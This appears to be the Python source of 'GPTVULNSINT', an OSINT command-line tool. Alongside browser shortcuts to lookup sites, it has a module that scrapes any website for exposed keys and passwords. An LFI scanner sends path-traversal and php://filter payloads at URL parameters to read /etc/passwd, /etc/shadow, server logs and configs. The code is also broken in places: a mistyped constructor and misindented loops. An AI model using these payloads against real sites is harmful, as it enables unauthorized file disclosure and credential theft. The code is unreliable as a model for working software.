import re
import asyncio
import aiohttp
import socket
import time
import logging
import os
from datetime import datetime
from urllib.parse import quote, urljoin, urlparse, parse_qs, urlencode
from ipaddress import ip_address
from collections import defaultdict
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
import os, platform, webbrowser, shutil, subprocess
from phonenumbers import geocoder, carrier
import phonenumbers

init(autoreset=True)
logging.basicConfig(
    filename='gptvulnsint.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def safe_open_url(url, description="url"):
    try:
        current_os = platform.system()

        
        if current_os == "Windows":
            webbrowser.open(url, new=2)
            print(Fore.YELLOW + f"Opening {description} in browser...")
            return True

        if shutil.which("wslview"):         
            subprocess.run(["wslview", url])
            print(Fore.YELLOW + f"Opening {description} in Windows browser...")
            return True

        for br in ("w3m", "lynx", "links", "elinks"):
            if shutil.which(br):
                print(Fore.YELLOW + f"Opening {description} in {br} ...")
                subprocess.run([br, url])
                return True

        if current_os == "Linux" and os.environ.get("DISPLAY") and shutil.which("xdg-open"):
            subprocess.run(["xdg-open", url])
            print(Fore.YELLOW + f"Opening {description} in system browser...")
            return True
        
        if current_os == "Darwin":
            subprocess.run(["open", url])
            print(Fore.YELLOW + f"Opening {description} in default browser...")
            return True

    except Exception as e:
        logging.error(f"Browser open failed: {e}")

    print(Fore.GREEN + f"\n[+] {description} URL: {url}")
    print(Fore.WHITE + "   (Ctrl+click or copy-paste into browser)")
    return False

def print_banner():
    print(Fore.YELLOW + "="*11)
    print(Fore.GREEN + r"GPTVULNSINT")
    print(Fore.YELLOW + "="*11)
    print()
    print(Fore.CYAN + "GPTVULNSINT v7.0 - Professional OSINT Framework")
    print(Fore.RED + "Author: ANONUM228 | For educational purposes only!")
    print()

def normalize_url(url):
    if not url:
        return ""
    url = url.lower()
    
    parsed = urlparse(url)
    
    netloc = parsed.netloc.replace('www.', '')
    
    normalized = f"{parsed.scheme}://{netloc}{parsed.path}"
    if parsed.query:
        normalized += f"?{parsed.query}"
    
    return normalized

def is_global_ip(url):
    try:
        parsed_url = url.replace('https://', '').replace('http://', '')
        hostname = parsed_url.split('/')[0].split(':')[0]
        
        if hostname.lower() in ['localhost', '127.0.0.1', '0.0.0.0', '::1']:
            return False
            
        internal_domains = ['.local', '.internal', '.corp', '.lan', '.home']
        if any(hostname.lower().endswith(domain) for domain in internal_domains):
            return False
            
        ip = socket.gethostbyname(hostname)
        ip_obj = ip_address(ip)
        
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
            print(Fore.RED + f"[-] BLOCKED: Private/reserved IP {ip}")
            return False
            
        return True
        
    except (socket.gaierror, ValueError):
        return True  
    except Exception:
        return True

async def fetch_url_async(session, url, timeout=10):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
            if response.status == 200:
                return await response.text()
            return None
    except Exception as e:
        print(Fore.RED + f"Failed to fetch {url[:50]}...: {e}")
        return None

async def scan_js_files_async(base_url, js_urls, max_files=5):
    all_js_content = []
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for js_url in js_urls[:max_files]:
            if js_url.startswith('//'):
                js_url = 'https:' + js_url
            elif js_url.startswith('/'):
                js_url = urljoin(base_url, js_url)
            elif not js_url.startswith('http'):
                continue
                
            tasks.append(fetch_url_async(session, js_url, 5))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, content in enumerate(results):
            if content and isinstance(content, str):
                all_js_content.append(content)
                
    return all_js_content

class GPTVULNSINT:
    def __init__(self):
        self.scan_results = []
        self.session = None
        self.visited_urls = set()
        print(Fore.GREEN + "[+] Framework initialized successfully!")
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def _safe_url_input(self, prompt, default_protocol='https://'):
        while True:
            try:
                url = input(Fore.CYAN + prompt).strip()
                if not url:
                    return None
                
                if not url.startswith(('http://', 'https://')):
                    url = default_protocol + url
                
                parsed = urlparse(url)
                if not parsed.scheme or not parsed.netloc:
                    print(Fore.RED + "Invalid URL format. Please try again.")
                    continue
                    
                normalized = normalize_url(url)
                if normalized in self.visited_urls:
                    print(Fore.YELLOW + "This URL has already been processed.")
                    continue
                    
                self.visited_urls.add(normalized)
                return url
                
            except KeyboardInterrupt:
                return None
            except Exception as e:
                print(Fore.RED + f"Error processing URL: {e}")
                return None
    
    async def freecampdev(self):
        try:
            url = "https://freecamp.dev/tools/network/subdomains"
            self.scan_results.append("FreeCampDev: Subdomain search opened")
            safe_open_url(url, "FreeCampDev")
        except Exception as e:
            print(Fore.RED + f"Error in FreeCampDev: {e}")
            logging.error(f"FreeCampDev error: {e}")
        
    async def scan(self):
        try:
            target_url = await self._safe_url_input("Enter URL: ")
            if not target_url:
                return
            
            if not await asyncio.to_thread(is_global_ip, target_url):
                print(Fore.RED + "SECURITY BLOCK: Target is internal/local")
                self.scan_results.append(f"URL Scan: {target_url} - BLOCKED")
                return
            
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    text = await response.text()
                    links = re.findall(r'href=["\'](https?://[^"\']+)', text)
                    
                    normalized_links = []
                    seen = set()
                    for link in links:
                        norm_link = normalize_url(link)
                        if norm_link and norm_link not in seen:
                            seen.add(norm_link)
                            normalized_links.append(link)
                    
                    print(Fore.GREEN + f"\n[+] Found {len(normalized_links)} unique external links:")
                    for i, link in enumerate(sorted(normalized_links)[:15], 1):
                        print(Fore.CYAN + f"  {i:2}. {link}")
                    
                    if len(normalized_links) > 15:
                        print(Fore.YELLOW + f"  ... and {len(normalized_links) - 15} more")
                    
                    self.scan_results.append(f"URL Scan: {target_url} - Found {len(normalized_links)} unique links")
        except asyncio.TimeoutError:
            print(Fore.RED + "Request timeout")
        except aiohttp.ClientError as e:
            print(Fore.RED + f"Network error: {e}")
        except Exception as e:
            print(Fore.RED + f"Error in scan: {e}")
            logging.error(f"Scan error: {e}")
            
    async def publicwww(self):
        try:
            dork = input(Fore.CYAN + "Enter search dork: ").strip()
            if not dork:
                return
                
            encoded = quote(dork)
            url = f"https://publicwww.com/websites/{encoded}"
            self.scan_results.append(f"PublicWWW Search: {dork}")
            safe_open_url(url, "PublicWWW")
        except Exception as e:
            print(Fore.RED + f"Error in publicwww: {e}")
            logging.error(f"PublicWWW error: {e}")
            
    async def censys(self):
        try:
            query = input(Fore.CYAN + "Enter Censys query: ").strip()
            if not query:
                return
                
            encoded = quote(query)
            url = f"https://search.censys.io/search?q={encoded}"
            self.scan_results.append(f"Censys Search: {query}")
            safe_open_url(url, "Censys")
        except Exception as e:
            print(Fore.RED + f"Error in censys: {e}")
            logging.error(f"Censys error: {e}")
            
    async def intelx(self):
        try:
            query = input(Fore.CYAN + "Enter IntelX query: ").strip()
            if not query:
                return
                
            encoded = quote(query)
            url = f"https://intelx.io/?s={encoded}"
            self.scan_results.append(f"IntelX Search: {query}")
            safe_open_url(url, "IntelX")
        except Exception as e:
            print(Fore.RED + f"Error in intelx: {e}")
            logging.error(f"IntelX error: {e}")
            
    async def crt(self):
        try:
            domain = input(Fore.CYAN + "Enter domain: ").strip()
            if not domain:
                return
                
            url = f"https://crt.sh/?q=%.{domain}"
            self.scan_results.append(f"crt.sh Search: {domain}")
            safe_open_url(url, "crt.sh")
        except Exception as e:
            print(Fore.RED + f"Error in crt: {e}")
            logging.error(f"CRT error: {e}")
            
    async def suip(self):
        try:
            target = input(Fore.CYAN + "Enter domain/IP: ").strip()
            if not target:
                return
                
            url = f"https://suip.biz/ru/?act=hostmap&host={target}"
            self.scan_results.append(f"suip Search: {target}")
            safe_open_url(url, "suip.biz")
        except Exception as e:
            print(Fore.RED + f"Error in suip: {e}")
            logging.error(f"Suip error: {e}")
            
    async def whois(self):
        try:
            domain = input(Fore.CYAN + "Enter Domain/IP (example site.co.ke): ").strip()
            if not domain:
                return

            url = f"https://www.whois.com/whois/{domain}"

            print(Fore.YELLOW + f"[*] Deep network scanning for {domain}...")
            self.scan_results.append(f"Network WHOIS: {domain} via CentralOps")
            safe_open_url(url, "CentralOps Domain Dossier")

        except Exception as e:
            print(Fore.RED + f"Error module WHOIS: {e}")

    async def headers(self):
        try:
            target_url = await self._safe_url_input("Enter URL for headers analysis: ")
            if not target_url:
                return
            
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    print(Fore.GREEN + f"\n[+] Headers for {target_url} (Status: {response.status}):")
                    security_headers = ['X-Frame-Options', 'X-Content-Type-Options',
                                      'Strict-Transport-Security', 'Content-Security-Policy',
                                      'X-XSS-Protection', 'Referrer-Policy']
                    
                    for header, value in response.headers.items():
                        if header in security_headers:
                            print(Fore.CYAN + f"{header}: {value}")
                        else:
                            print(Fore.WHITE + f"{header}: {value}")
                    
                    missing = [h for h in security_headers if h not in response.headers]
                    if missing:
                        print(Fore.RED + f"\nMissing security headers: {', '.join(missing)}")
                    
                    self.scan_results.append(f"Header Analysis: {target_url} - Status {response.status}")
                    
        except asyncio.TimeoutError:
            print(Fore.RED + "Request timeout")
        except aiohttp.ClientError as e:
            print(Fore.RED + f"Network error: {e}")
        except Exception as e:
            print(Fore.RED + f"Error in headers: {e}")
            logging.error(f"Headers error: {e}")
            
    async def vulners(self):
        try:
            query = input(Fore.CYAN + "Enter vuln query: ").strip()
            if not query:
                return
                
            encoded = quote(query)
            url = f"https://vulners.com/search?query={encoded}"
            self.scan_results.append(f"Vulners Search: {query}")
            safe_open_url(url, "Vulners")
        except Exception as e:
            print(Fore.RED + f"Error in vulners: {e}")
            logging.error(f"Vulners error: {e}")
            
    async def wp_scanner(self):
        try:
            url = "https://hackertarget.com/wordpress-security-scan/"
            print(Fore.YELLOW + "Note: Paste target URL manually in the browser")
            self.scan_results.append("WordPress Scanner opened")
            safe_open_url(url, "WordPress Scanner")
        except Exception as e:
            print(Fore.RED + f"Error in wp_scanner: {e}")
            logging.error(f"WP Scanner error: {e}")
        
    async def phind(self):
        try:
            url = "https://www.phind.com/"
            self.scan_results.append("Phind AI Search opened")
            safe_open_url(url, "Phind")
        except Exception as e:
            print(Fore.RED + f"Error in phind: {e}")
            logging.error(f"Phind error: {e}")
        
    async def sensitive_data_scan_async(self):
        try:
            target_url = await self._safe_url_input("Enter URL to scan: ")
            if not target_url:
                return
                
            print(Fore.YELLOW + f"\n[⚡️] Starting FAST sensitive data scan for: {target_url}")
            
            patterns = {
                "AWS_ACCESS_KEY": r'AKIA[0-9A-Z]{16}',
                "AWS_SECRET_KEY": r'aws[^"\']*["\']([0-9a-zA-Z/+]{40})["\']',
                "STRIPE_SECRET_KEY": r'sk_live_[0-9a-zA-Z]{24}',
                "DATABASE_URL": r'(postgres|mysql|mongodb)://[^:]+:[^@]+@',
                "GITHUB_TOKEN": r'gh(p|o|u|s|r)_[0-9a-zA-Z]{36}',
                "TWILIO_API_KEY": r'SK[0-9a-fA-F]{32}',
                "JWT_TOKEN": r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\.[A-Za-z0-9._-]{10,}',
                "API_KEY_GENERIC": r'["\'][0-9a-zA-Z\-_]{20,50}["\']',
                "PASSWORD": r'password["\']?\s*[=:]\s*["\']([^"\']{8,50})["\']',
                "EMAIL": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            }
            
            print(Fore.YELLOW + "[+] Fetching main page...")
            async with aiohttp.ClientSession() as session:
             async with session.get(target_url, timeout=15) as response:
                    if response.status != 200:
                        print(Fore.RED + f"[-] HTTP Error: {response.status}")
                        return
                    
                    html_content = await response.text()
            
            print(Fore.YELLOW + "[+] Parsing for JavaScript files...")
            soup = BeautifulSoup(html_content, 'html.parser')
            
            text_content = soup.get_text()
            lines = [line.strip() for line in text_content.splitlines() if line.strip()]
            text_to_scan = "\n".join(lines[:500])

            js_urls = []
            for script in soup.find_all('script', src=True):
                src = script['src']
                if src:
                    if src.startswith('//'):
                        src = 'https:' + src
                    elif src.startswith('/'):
                        src = urljoin(target_url, src)
                    elif not src.startswith('http'):
                        continue
                    js_urls.append(src)
            
            print(Fore.YELLOW + f"Found {len(js_urls)} JavaScript files")
            
            js_contents = []
            if js_urls:
                js_contents = await scan_js_files_async(target_url, js_urls, max_files=3)
                print(Fore.YELLOW + f"Loaded {len(js_contents)} JS files")
            
            all_content = text_to_scan
            for js_content in js_contents:
                all_content += "\n" + js_content[:1000]
            
            print(Fore.YELLOW + f"Total content to scan: {len(all_content):,} characters")
            
            print(Fore.YELLOW + "Scanning for secrets (timeout: 10 seconds)...")
            
            results = defaultdict(list)
            start_time = time.time()
            
            for name, pattern in patterns.items():
                if time.time() - start_time > 10:
                    print(Fore.YELLOW + "Scan timeout reached, stopping...")
                    break
                
                try:
                    matches = re.finditer(pattern, all_content, re.IGNORECASE)
                    count = 0
                    for match in matches:
                        if count >= 10:
                            break
                        
                        value = match.group(0)
                        if match.lastindex:
                            value = match.group(match.lastindex)
                        
                        if self._is_test_data(value):
                            continue
                        
                        display_val = value[:30] + "..." if len(value) > 30 else value
                        results[name].append(display_val)
                        count += 1
                        
                except Exception as e:
                    continue
            
            print(Fore.GREEN + "\n" + "="*60)
            print(Fore.YELLOW + "🔐 Scan results:")
            print(Fore.GREEN + "="*60)
            
            total_found = sum(len(v) for v in results.values())
            
            if total_found == 0:
                print(Fore.GREEN + "No secrets found (scan completed in 10s)")
            else:
                critical = ["AWS_ACCESS_KEY", "AWS_SECRET_KEY", "STRIPE_SECRET_KEY", "DATABASE_URL"]
                high = ["GITHUB_TOKEN", "TWILIO_API_KEY"]
                medium = ["JWT_TOKEN", "API_KEY_GENERIC", "PASSWORD"]
                
                for risk_level, pattern_names in [("🔴 CRITICAL", critical), 
                                                 ("🟠 HIGH", high), 
                                                 ("🟡 MEDIUM", medium)]:
                    found_items = []
                for name in pattern_names:
                        if name in results:
                            found_items.extend(results[name])
                    
                        if found_items:
                           color = {"🔴 CRITICAL": Fore.RED, "🟠 HIGH": Fore.YELLOW, "🟡 MEDIUM": Fore.MAGENTA}[risk_level]
                           print(color + f"\n{risk_level} ({len(found_items)} found):")
                        for i, item in enumerate(found_items[:3], 1):
                            print(color + f"  {i}. {item}")
                        if len(found_items) > 3:
                            print(color + f"  ... and {len(found_items)-3} more")

                print(Fore.RED + f"\nTotal secrets found: {total_found}")
                print(Fore.YELLOW + f"Scan completed in {time.time() - start_time:.1f} seconds")
            
            print(Fore.GREEN + "="*60)
            
            self.scan_results.append(f"Fast Secrets Scan: {target_url} - Found {total_found} secrets")

            if results:
                await asyncio.to_thread(self._quick_save_results, target_url, results)
                
        except asyncio.TimeoutError:
            print(Fore.RED + "[-] Scan timeout: Operation took too long")
        except aiohttp.ClientError as e:
            print(Fore.RED + f"[-] Network error: {e}")
        except Exception as e:
            print(Fore.RED + f"[-] Scan error: {str(e)[:100]}")
            logging.error(f"Sensitive data scan error: {e}")
    
    async def sensitive_data_scan(self):
        await self.sensitive_data_scan_async()
    
    def _is_test_data(self, value):
        test_words = ['test', 'example', 'demo', 'fake', 'placeholder', 'xxx', 'aaa']
        return any(word in value.lower() for word in test_words)
    
    def _quick_save_results(self, url, results):
        try:
            filename = f"scan_{datetime.now().strftime('%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(f"Scan: {url}\n")
                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n")
                
                for name, items in results.items():
                    if items:
                        f.write(f"\n{name} ({len(items)}):\n")
                        for item in items:
                            f.write(f"  - {item}\n")
            
            print(Fore.GREEN + f"Quick report saved: {filename}")
        except Exception as e:
            print(Fore.RED + f"Error saving report: {e}")
    
    async def lfi_scanner(self):
        try:
            url = await self._safe_url_input("Enter target URL: ", default_protocol='http://')
            if not url:
                return
                
            scanner = LFI_Scanner()
            await scanner.scan_site(url)
            self.scan_results.append(f"LFI Scan: {url}")
        except Exception as e:
            print(Fore.RED + f"Error in LFI scanner: {e}")
            logging.error(f"LFI scanner error: {e}")
    
    async def kaspersky(self):
        try:
            query = input(Fore.CYAN + "Enter hash/IP/domain: ").strip()
            if not query:
                return
                
            url = f"https://opentip.kaspersky.com/{query}/"
            self.scan_results.append(f"Kaspersky Check: {query}")
            safe_open_url(url, "Kaspersky")
        except Exception as e:
            print(Fore.RED + f"Error in kaspersky: {e}")
            logging.error(f"Kaspersky error: {e}")
            
    async def metadefender(self):
        try:
            query = input(Fore.CYAN + "Enter hash/url: ").strip()
            if not query:
                return
                
            url = f"https://metadefender.opswat.com/results?input={query}"
            self.scan_results.append(f"MetaDefender Check: {query}")
            safe_open_url(url, "MetaDefender")
        except Exception as e:
            print(Fore.RED + f"Error in metadefender: {e}")
            logging.error(f"MetaDefender error: {e}")
            
    async def malwarebazaar(self):
        try:
            url = "https://bazaar.abuse.ch/browse/"
            self.scan_results.append("MalwareBazaar opened")
            safe_open_url(url, "MalwareBazaar")
        except Exception as e:
            print(Fore.RED + f"Error in malwarebazaar: {e}")
            logging.error(f"MalwareBazaar error: {e}")
        
    async def virustotal(self):
        try:
            url = "https://www.virustotal.com/gui/home/search"
            self.scan_results.append("VirusTotal opened")
            safe_open_url(url, "VirusTotal")
        except Exception as e:
            print(Fore.RED + f"Error in virustotal: {e}")
            logging.error(f"VirusTotal error: {e}")
        
    async def epieos(self):
        try:
            url = "https://epieos.com/"
            self.scan_results.append("EpieOS opened")
            safe_open_url(url, "Epieos")
        except Exception as e:
            print(Fore.RED + f"Error in epieos: {e}")
            logging.error(f"EpieOS error: {e}")
        
    async def email_parse(self):
        try:
            target_url = await self._safe_url_input("Enter website URL: ")
            if not target_url:
                return
                
            print(Fore.YELLOW + f"\nExtracting emails from: {target_url}")
            
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    if response.status != 200:
                        print(Fore.RED + f"HTTP Error: {response.status}")
                        return
                    
                    html_content = await response.text()
                    
                    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html_content)
                    
                    soup = BeautifulSoup(html_content, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        if link['href'].startswith('mailto:'):
                            email = link['href'][7:].split('?')[0]
                            if re.match(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', email):
                                emails.append(email)
                    
                    unique_emails = sorted(set([e.lower() for e in emails]))
                    
                    if unique_emails:
                        print(Fore.GREEN + f"\nFound {len(unique_emails)} unique email(s):")
                        for email in unique_emails:
                            print(Fore.CYAN + f"  • {email}")
                    else:
                        print(Fore.YELLOW + "No emails found")
                        
                    self.scan_results.append(f"Email Parse: {target_url} - Found {len(unique_emails)} emails")
                    
        except asyncio.TimeoutError:
            print(Fore.RED + "Request timeout")
        except aiohttp.ClientError as e:
            print(Fore.RED + f"Network error: {e}")
        except Exception as e:
            print(Fore.RED + f"Error in email_parse: {e}")
            logging.error(f"Email parse error: {e}")
            
    async def securelist(self):
        try:
            url = "https://securelist.com/"
            self.scan_results.append("SecureList opened")
            safe_open_url(url, "SecureList")
        except Exception as e:
            print(Fore.RED + f"Error in securelist: {e}")
            logging.error(f"SecureList error: {e}")

    async def mitre(self):
        try:
            url = "https://attack.mitre.org/"
            self.scan_results.append("MITRE ATT&CK opened")
            safe_open_url(url, "MITRE ATT&CK")
        except Exception as e:
            print(Fore.RED + f"Error in mitre: {e}")
            logging.error(f"MITRE error: {e}")
        
    async def misp(self):
        try:
            url = "https://www.misp-project.org/"
            self.scan_results.append("MISP opened")
            safe_open_url(url, "MISP")
        except Exception as e:
            print(Fore.RED + f"Error in misp: {e}")
            logging.error(f"MISP error: {e}")
        
    async def cell_id(self):
        try:
            url = "https://infocelltowers.ru/ymaps"
            print(Fore.YELLOW + "[!] Russian cell tower database")
            self.scan_results.append("Cell Tower DB opened")
            safe_open_url(url, "Cell Tower DB")
        except Exception as e:
            print(Fore.RED + f"Error in cell_id: {e}")
            logging.error(f"Cell ID error: {e}")
        
    async def usgs(self):
        try:
            url = "https://earthexplorer.usgs.gov/"
            print(Fore.YELLOW + "USGS may be slow to load")
            self.scan_results.append("USGS opened")
            safe_open_url(url, "USGS")
        except Exception as e:
            print(Fore.RED + f"Error in usgs: {e}")
            logging.error(f"USGS error: {e}")

    async def phone_analyzer(self):
        try:
            number = input(Fore.CYAN + "Enter number (example +254...): ").strip()
            if not number:
                return

            parsed_number = phonenumbers.parse(number)

            if not phonenumbers.is_valid_number(parsed_number):
                print(Fore.RED + "Number no vallid!")
                return

            region = geocoder.description_for_number(parsed_number, "ru")
            operator = carrier.name_for_number(parsed_number, "en")

            print(Fore.GREEN + f"\nCountry/Region: {region}")
            print(Fore.GREEN + f"Operator: {operator}")

            if number.startswith("+") and "Safaricom" not in operator:
                number = ' ' + number 
                print(Fore.RED + "ATTENTION: Number no belongs Safaricom (M-Pesa)!")

            self.scan_results.append(f"Phone Analysis: {number} ({region}, {operator})")

            search_url = f"https://www.google.com/search?q=\"{number}\" + (scam OR fraud OR wash-wash)"
            safe_open_url(search_url, "M-Pesa Fraud Search")

        except Exception as e:
            print(Fore.RED + f"Error analyze number: {e}")

        
    async def google_search(self):
        try:
            query = input(Fore.CYAN + "Enter search query: ").strip()
            if not query:
                return
                
            encoded = quote(query)
            url = f"https://www.google.com/search?q={encoded}"
            self.scan_results.append(f"Google Search: {query}")
            safe_open_url(url, "Google")
        except Exception as e:
            print(Fore.RED + f"Error in google_search: {e}")
            logging.error(f"Google search error: {e}")
            
    async def generate_pdf(self):
        try:
            if not self.scan_results:
                print(Fore.RED + "No scan results to report")
                return
                
            filename = input(Fore.CYAN + "Enter report name (without .pdf): ").strip()
            if not filename:
                filename = f"gptvulnsint_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                
            filename += '.pdf'
            
            await asyncio.to_thread(self._create_pdf, filename)
            
            print(Fore.GREEN + f"\nPDF saved: {filename}")
            print(Fore.YELLOW + f"Total entries: {len(self.scan_results)}")
          
            self.scan_results = []
            self.visited_urls.clear()
            
        except Exception as e:
            print(Fore.RED + f"PDF generation error: {e}")
            logging.error(f"PDF generation error: {e}")
    
    def _create_pdf(self, filename):
        try:
            c = canvas.Canvas(filename, pagesize=A4)
            width, height = A4
            
            c.setFont("Helvetica-Bold", 20)
            c.drawString(50, height - 50, "GPTVULNSINT Security Report")
            
            c.setFont("Helvetica", 10)
            c.drawString(50, height - 80, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, height - 100, f"Total scans: {len(self.scan_results)}")
            
            y = height - 130
            c.setFont("Helvetica-Bold", 12)
            c.drawString(50, y, "Scan Results:")
            
            c.setFont("Helvetica", 10)
            y -= 20
            
            for i, result in enumerate(self.scan_results, 1):
                  if y < 50:
                    c.showPage()
                    y = height - 50
                    c.setFont("Helvetica", 10)
                    
            c.drawString(60, y, f"{i}. {result[:100]}")
            y -= 15
            
            c.save()
        except Exception as e:
            raise Exception(f"Failed to create PDF: {e}")
            
    async def show_stats(self):
        try:
            if not self.scan_results:
                print(Fore.YELLOW + "No scans performed yet")
                return
                
            print(Fore.CYAN + "\n" + "="*50)
            print(Fore.YELLOW + "Current Statistic")
            print(Fore.CYAN + "="*50)
            print(Fore.GREEN + f"Total scans performed: {len(self.scan_results)}")
            print(Fore.GREEN + f"Unique URLs processed: {len(self.visited_urls)}")
            
            categories = defaultdict(int)
            for result in self.scan_results:
                if "Scan" in result:
                    categories["Scans"] += 1
                elif "Search" in result:
                    categories["Searches"] += 1
                else:
                    categories["Other"] += 1
                    
            for category, count in categories.items():
                print(Fore.CYAN + f"  {category}: {count}")
                
            print(Fore.CYAN + "="*50)
            
        except Exception as e:
            print(Fore.RED + f"Error in show_stats: {e}")
            logging.error(f"Show stats error: {e}")
        
    async def clear_results(self):
        try:
            confirm = input(Fore.YELLOW + "Clear all results? (y/n): ").lower()
            if confirm == 'y':
                self.scan_results = []
                self.visited_urls.clear()
                print(Fore.GREEN + "Results cleared")
        except Exception as e:
            print(Fore.RED + f"Error in clear_results: {e}")
            logging.error(f"Clear results error: {e}")

class LFI_Scanner:
    def init(self):
        self.payloads = [
            '../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/shadow',
            '../../../../../../../../../../etc/hosts',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/resource=index.php',
            '../../../../../../../../../../windows/win.ini',
            '../../../../../../../../../../windows/system.ini',
            '..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        ]
        
        self.payloads.extend([
            '....//....//....//....//....//etc/passwd',
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            '//etc//passwd',
            '..//..//..//..//..//etc/passwd',
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%2500',
            '../../../../etc/passwd%00.jpg',
            '../../../../etc/passwd%00.php',
            
            'php://filter/read=convert.base64-encode/resource=index',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=../../../../etc/passwd',
            
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',
            '../../../../var/log/apache2/access.log',
            
            '/etc/apache2/apache2.conf',
            '/etc/httpd/conf/httpd.conf',
            '../../../../etc/apache2/apache2.conf',
        ])
        
        self.parameters = ['file', 'page', 'path', 'view', 'include', 'doc']
        
        self.parameters.extend([
            'cat', 'dir', 'action', 'board', 'date', 'detail', 
            'download', 'prefix', 'folder', 'show',
'site', 'type', 'document', 'root', 'display',
            'locate', 'showpage', 'img', 'filename', 'name',
            'menu', 'load', 'header', 'inc', 'loc', 'filepath',
        ])
        
        self.patterns = {
            'LINUX PASSWD': [r'root:.*:0:0:', r'daemon:.*:1:1:'],
            'WINDOWS INI': [r'\[fonts\]', r'\[extensions\]'],
            'PHP CODE': [r'<\?php', r'phpinfo\(\)'],
        }
    
    async def check_url(self, session, url):
        try:
            async with session.get(url, timeout=3, ssl=False) as r:
                text = await r.text()
                
                for vuln_type, patterns in self.patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, text, re.IGNORECASE):
                            return {
                                'found': True,
                                'url': url,
                                'type': vuln_type,
                                'status': r.status
                            }
                
                lines = text.split('\n')
                colon_count = 0
                for line in lines[:5]:
                    if line.count(':') >= 5:
                       colon_count += 1
                
                if colon_count >= 2:
                    return {
                        'found': True,
                        'url': url,
                        'type': 'SUSPICIOUS FILE',
                        'status': r.status
                    }
                
                return {'found': False, 'url': url, 'status': r.status}
                
        except Exception as e:
            return {'found': False, 'url': url, 'status': 'ERROR', 'error': str(e)[:30]}
    
    async def advanced_check(self, session, url):
        try:
            async with session.get(url, timeout=3, ssl=False) as r:
                text = await r.text()
                
                indicators = {
                    'FILE_EXISTS': ['root:', 'daemon:', '[fonts]', '<?php'],
                    'ERRORS': ['failed to open', 'no such file', 'warning:', 'include('],
                    'PERMISSIONS': ['forbidden', 'access denied', 'permission denied'],
                }
                
                for indicator_type, patterns in indicators.items():
                    for pattern in patterns:
                        if pattern.lower() in text.lower():
                            return {
                                'found': True,
                                'url': url,
                                'type': f'{indicator_type} - {pattern}',
                                'status': r.status,
                                'content': text[:200]
                            }
                
                return {'found': False, 'url': url, 'status': r.status}
                
        except Exception as e:
            return {'found': False, 'url': url, 'error': str(e)}
    
    def make_test_urls(self, base_url):
        urls = []
        parsed = urlparse(base_url)
        params = []
        query = parse_qs(parsed.query)
        
        if query:
            params = list(query.keys())[:2]
        else:
            params = self.parameters[:3]
        
        for param in params:
            for payload in self.payloads[:10]:
                if query:
                    new_q = query.copy()
                    new_q[param] = payload
                    query_str = urlencode(new_q, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_str}"
                else:
                    test_url = f"{base_url}?{param}={payload}"
                
                urls.append(test_url)
        
        return urls
    
    async def scan_site(self, url):
        print("\n" + "="*60)
        print("🚀 LFI SCANNER STARTED")
        print("="*60)
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"🎯 Target: {url}")
        print(f"📦 Payloads: {len(self.payloads)}")
        print(f"🔧 Parameters: {len(self.parameters)}")
        
        test_urls = self.make_test_urls(url)
        print(f"📨 Test URL: {len(test_urls)}")
        
        found_vulns = []
        
        async with aiohttp.ClientSession(
            headers={'User-Agent': 'Mozilla/5.0'},
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            
            print("\n[1/3] 🔍 Checking the website...")
            try:
                async with session.get(url, timeout=5) as r:
                    print(f"    Status: {r.status}")
            except Exception as e:
                print(f"    ❌ Error: {e}")
                return

            print("[2/3] ⚡️ Running checks...")
            
            tasks = []
            for test_url in test_urls[:50]:
                tasks.append(self.check_url(session, test_url))
            
            results = await asyncio.gather(*tasks)
            
            print("[3/3] 📊 Analyzing the results...")
            
            for result in results:
                if result['found']:
                    found_vulns.append(result)
                    print(f"\n    🔴 Found: {result['type']}")
                    print(f"       URL: {result['url']}")
                    print(f"       Status: {result['status']}")
            
            print("\n" + "="*60)
            print("📊 SCAN RESULTS:")
            print("="*60)
            print(f"Total checks: {len(results)}")
            print(f"Vulnerabilities found: {len(found_vulns)}")
            
            if found_vulns:
                print("\n🚨 Vulnerabilities:")
                for vuln in found_vulns:
                    print(f"  • {vuln['type']}: {vuln['url']}")
            else:
                print("\n✅ No vulnerabilities found")
                print("\n💡 Examples of test queries:")
                parsed = urlparse(url)
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                print(f"{base}?file=../../../../../../../../../../etc/passwd")
